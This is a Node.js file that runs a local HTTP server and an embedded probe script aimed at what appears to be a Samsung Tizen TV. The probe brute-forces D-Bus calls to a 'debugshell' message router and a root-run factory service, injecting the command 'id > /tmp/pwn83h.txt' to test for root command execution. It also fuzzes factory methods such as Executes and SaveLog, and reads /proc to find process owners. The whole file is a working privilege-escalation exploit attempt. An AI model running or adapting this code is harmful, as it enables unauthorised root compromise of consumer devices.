'use strict';
var http = require('http');
var fs = require('fs');
var cp = require('child_process');

var PORT = 8172;
var PROBE_FILE = '/home/owner/share/tmp/sdk_tools/tbprobe83h.txt';
var PWN = '/tmp/pwn83h.txt';

var L = [
  'var fs = require("fs");',
  'var cp = require("child_process");',
  'var r = {};',

  // 1. Find UID of debugshell_C D-Bus owner
  'try {',
  '  var o0 = cp.spawnSync("gdbus", ["call","--system","--dest","org.freedesktop.DBus","--object-path","/","--method","org.freedesktop.DBus.GetNameOwner","viola.ser.server.MessageRouter.debugshell_C.message"], {timeout:5000});',
  '  var owner = (o0.stdout||Buffer.from("")).toString().trim();',
  '  r.debugshell_owner = owner;',
  '  var uid_match = owner.match(/\\((\\d+)\\)/);',
  '  if (!uid_match) {',
  '    var o0b = cp.spawnSync("gdbus", ["call","--system","--dest","org.freedesktop.DBus","--object-path","/","--method","org.freedesktop.DBus.GetConnectionUnixProcessID","viola.ser.server.MessageRouter.debugshell_C.message"], {timeout:5000});',
  '    r.debugshell_pid = (o0b.stdout||Buffer.from("")).toString().trim();',
  '    var pid_m = r.debugshell_pid.match(/(\\d+)/);',
  '    if (pid_m) {',
  '      var st0 = fs.readFileSync("/proc/" + pid_m[1] + "/status", "utf8");',
  '      var uid0 = st0.match(/^Uid:\\t(\\d+)/m);',
  '      var comm0 = fs.readFileSync("/proc/" + pid_m[1] + "/comm", "utf8").trim();',
  '      r.debugshell_proc = { pid: pid_m[1], uid: uid0 ? uid0[1] : "?", comm: comm0 };',
  '    }',
  '  }',
  '} catch(e) { r.debugshell_owner_err = e.message.slice(0,100); }',

  // 2. SendMessage on debugshell with bare integers (no type prefix)
  'var msg_tries = [',
  '  ["0", "exec"], ["0", "shell"], ["0", "cmd"],',
  '  ["1", "exec"], ["1", "shell"],',
  '  ["100", "exec"]',
  '];',
  'r.debugshell_calls = {};',
  'msg_tries.forEach(function(t) {',
  '  var key = "c" + t[0] + "_" + t[1];',
  '  try {',
  '    var o1 = cp.spawnSync("gdbus", [',
  '      "call","--system","--dest","viola.ser.server.MessageRouter.debugshell_C.message",',
  '      "--object-path","/viola/ser/server/MessageRouter/debugshell_C/message",',
  '      "--method","viola.ser.server.MessageRouter.debugshell_C.message.SendMessage",',
  '      "me", t[0], t[1], "id > ' + PWN + '"',
  '    ], {timeout:5000});',
  '    r.debugshell_calls[key] = {',
  '      status: o1.status,',
  '      out: (o1.stdout||Buffer.from("")).toString().trim().slice(0,200),',
  '      err: (o1.stderr||Buffer.from("")).toString().trim().slice(0,100)',
  '    };',
  '  } catch(e) { r.debugshell_calls[key] = e.message.slice(0,60); }',
  '});',

  // 3. Check pwn after debugshell attempts
  'try { r.pwn1 = fs.readFileSync("' + PWN + '","utf8").trim(); } catch(e) {}',

  // 4. Factory Executes method - try various (key, cmd) combos
  //    kfactoryd runs as uid=0! Executes returns (s) str
  'r.factory_exec = {};',
  'var exec_combos = [[0,0],[0,1],[1,0],[1,1],[2,0],[3,0],[4,0],[0,2]];',
  'exec_combos.forEach(function(c) {',
  '  var key = "k" + c[0] + "_c" + c[1];',
  '  try {',
  '    var o2 = cp.spawnSync("gdbus", [',
  '      "call","--system","--dest","org.tizen.tv.factory-service",',
  '      "--object-path","/TIFacSerObj",',
  '      "--method","org.tizen.tv.factoryservice.Executes",',
  '      String(c[0]), String(c[1])',
  '    ], {timeout:5000});',
  '    r.factory_exec[key] = {',
  '      status: o2.status,',
  '      out: (o2.stdout||Buffer.from("")).toString().trim().slice(0,300),',
  '      err: (o2.stderr||Buffer.from("")).toString().trim().slice(0,80)',
  '    };',
  '  } catch(e) { r.factory_exec[key] = e.message.slice(0,60); }',
  '});',

  // 5. Factory GetStrItem with various keys (now bare int)
  'r.factory_stritem = {};',
  'var str_keys = [0, 1, 2, 3, 100, 200];',
  'str_keys.forEach(function(k) {',
  '  try {',
  '    var o3 = cp.spawnSync("gdbus", [',
  '      "call","--system","--dest","org.tizen.tv.factory-service",',
  '      "--object-path","/TIFacSerObj",',
  '      "--method","org.tizen.tv.factoryservice.GetStrItem",',
  '      String(k)',
  '    ], {timeout:5000});',
  '    r.factory_stritem[k] = {',
  '      status: o3.status,',
  '      out: (o3.stdout||Buffer.from("")).toString().trim().slice(0,200),',
  '      err: (o3.stderr||Buffer.from("")).toString().trim().slice(0,80)',
  '    };',
  '  } catch(e) { r.factory_stritem[k] = e.message.slice(0,60); }',
  '});',

  // 6. Factory GetFString with ftype 0..5
  'r.factory_fstring = {};',
  'var ftype_vals = [0, 1, 2, 3, 4, 5];',
  'ftype_vals.forEach(function(ft) {',
  '  try {',
  '    var o4 = cp.spawnSync("gdbus", [',
  '      "call","--system","--dest","org.tizen.tv.factory-service",',
  '      "--object-path","/TIFacSerObj",',
  '      "--method","org.tizen.tv.factoryservice.GetFString",',
  '      String(ft)',
  '    ], {timeout:4000});',
  '    r.factory_fstring[ft] = {',
  '      status: o4.status,',
  '      out: (o4.stdout||Buffer.from("")).toString().trim().slice(0,200),',
  '      err: (o4.stderr||Buffer.from("")).toString().trim().slice(0,60)',
  '    };',
  '  } catch(e) { r.factory_fstring[ft] = e.message.slice(0,60); }',
  '});',

  // 7. Factory SaveLog with mode 0, 1, 2
  'r.factory_savelog = {};',
  'var log_modes = [0, 1, 2];',
  'log_modes.forEach(function(m) {',
  '  try {',
  '    var o5 = cp.spawnSync("gdbus", [',
  '      "call","--system","--dest","org.tizen.tv.factory-service",',
  '      "--object-path","/TIFacSerObj",',
  '      "--method","org.tizen.tv.factoryservice.SaveLog",',
  '      String(m)',
  '    ], {timeout:5000});',
  '    r.factory_savelog[m] = {',
  '      status: o5.status,',
  '      out: (o5.stdout||Buffer.from("")).toString().trim().slice(0,200),',
  '      err: (o5.stderr||Buffer.from("")).toString().trim().slice(0,60)',
  '    };',
  '  } catch(e) { r.factory_savelog[m] = e.message.slice(0,60); }',
  '});',

  // 8. Find kfactoryd binary and check it
  'try {',
  '  var o6 = cp.spawnSync("gdbus", ["call","--system","--dest","org.freedesktop.DBus","--object-path","/","--method","org.freedesktop.DBus.GetConnectionUnixProcessID","org.tizen.tv.factory-service"], {timeout:5000});',
  '  var fpid_str = (o6.stdout||Buffer.from("")).toString().trim();',
  '  r.factory_pid_raw = fpid_str;',
  '  var fp_m = fpid_str.match(/(\\d+)/);',
  '  if (fp_m) {',
  '    var fpid = fp_m[1];',
  '    r.factory_exe = fs.readFileSync("/proc/" + fpid + "/exe").toString ? "sym:ok" : "?";',
  '    var fcmdl = fs.readFileSync("/proc/" + fpid + "/cmdline", "utf8");',
  '    r.factory_cmdline = fcmdl.replace(/\\0/g," ").slice(0,100);',
  '    var fst = fs.readFileSync("/proc/" + fpid + "/status", "utf8");',
  '    var fuid = fst.match(/^Uid:\\t(\\d+)/m);',
  '    r.factory_pid_uid = { pid: fpid, uid: fuid ? fuid[1] : "?" };',
  '  }',
  '} catch(e) { r.factory_pid_err = e.message.slice(0,100); }',

  // 9. Check pwn final
  'try { r.pwn_final = fs.readFileSync("' + PWN + '","utf8").trim(); } catch(e) { r.pwn_final_err = e.code; }',

  'var out = JSON.stringify(r, null, 2);',
  'try { fs.writeFileSync("' + PROBE_FILE + '", out); } catch(e2) {}',
  'process.stdout.write(out);'
];

var INNER = L.join('\n');

function runProbe(cb) {
  cp.execFile(process.execPath, ['-e', INNER], { timeout: 150000 }, function(err, stdout, stderr) {
    if (err) {
      cb(JSON.stringify({ exec_error: err.message.slice(0,200), stderr: (stderr||'').slice(0,500) }));
    } else {
      cb(stdout || '{}');
    }
  });
}

var server = http.createServer(function(req, res) {
  runProbe(function(out) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(out);
  });
});

server.on('error', function(e) {
  try { fs.writeFileSync(PROBE_FILE, JSON.stringify({ server_err: e.message })); } catch(e2) {}
});

server.listen(PORT, '127.0.0.1', function() {
  runProbe(function(out) {
    try { fs.writeFileSync(PROBE_FILE, out); } catch(e) {}
  });
});

setInterval(function() {}, 60000);
